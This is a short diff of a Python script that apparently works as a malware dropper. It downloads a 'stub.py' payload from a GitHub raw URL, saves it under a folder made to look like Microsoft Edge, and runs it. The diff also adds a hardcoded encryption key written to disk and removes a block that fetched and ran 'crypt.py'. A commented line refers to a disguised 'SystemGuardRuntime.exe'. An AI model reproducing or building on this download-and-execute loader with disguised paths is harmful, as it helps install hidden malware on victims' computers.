@@ -39,15 +39,8 @@ try:
             stubUrl = 'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/stub.py'
             stubr = requests.get(stubUrl, allow_redirects=True)
             ff.write(stubr.content)
+            open("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\encryption_key.txt", "w").write("DOfDM6ngxM3Kz_Qj1o4cNDRmnUiZWv3Cp-0CqXsONqM=")
         
-        with open("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\crypt.py", "w") as fff:
-            cryptUrl = 'https://raw.githubusercontent.com/ScripterThing/BDPPL/main/crypt.py'
-            cryptr = requests.get(cryptUrl, allow_redirects=True)
-            fff.write(cryptr.content)
-        
-
-        
-        os.system(f"python \"C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\crypt.py\"")
         os.system(f"python \"C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\stub.py\"")
 
         #os.system(f"\"C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\SystemGuardRuntime.exe\"")
